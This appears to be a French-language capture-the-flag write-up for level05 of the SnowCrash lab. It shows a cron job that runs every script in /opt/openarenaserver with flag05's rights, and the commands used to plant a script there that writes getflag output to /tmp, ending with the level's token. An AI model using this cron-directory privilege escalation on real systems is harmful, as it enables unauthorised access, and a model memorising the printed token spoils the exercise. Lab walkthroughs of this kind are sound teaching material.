@@ -1,0 +1,42 @@
+cette fois aucun indices direct
+
+j'utilise la bonne vielle technique du ls -AR | grep flag05 ou level05
+
+je tombe sur quelques resultats
+
+je me souvient qu'a l'excercice 1 a coté du flag00 il y avait un flag05 qui s'appellait openarenaserver
+
+je fait un 'find . openarenaserver' et je vois ca '/rofs/var/mail/level05'
+
+je cat ce fichier et j'obtient 
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+cette ligne a l'air d'exécuté sh /usr/sbin/openarenaserver avec les droits de flag05 toutes les 2 minutes
+
+level05@SnowCrash:/rofs/var/mail$ cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+openarenaserver va regarder chaque fichier dans /opt/openarenaserver/* 
+et va exécuter les commandes dans un sous shell avec un timeout de 5s imposé par ulimit
+
+on doit pouvoir crée un script qui appelera getflag dans /opt/openarenaserver/
+
+ma premiere idée a été de faire "echo "getflag" > /opt/openarenaserver/mygetflag"
+
+mais rien ne se passe et mon fichier est bien rm et rien n'est print
+
+j'ai tester des trucs plus compliquer
+echo "echo `getflag`" > /opt/openarenaserver/mygetflag mais ca ne marche pas non plus
+
+ensuite j'ai repenser au fait que (ulimit -t 5; bash -x "$i") s'exécute dans un sous-shell
+il faut donc crée un fichier dans un repertoire ou on pourra le lire
+echo "getflag > /rofs/mygetflag" > /opt/openarenaserver/mygetflag
+rofs n'a pas marché je suis passer avec /tpm et
+level05@SnowCrash:/rofs$ cat /tmp/mygetflag
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+
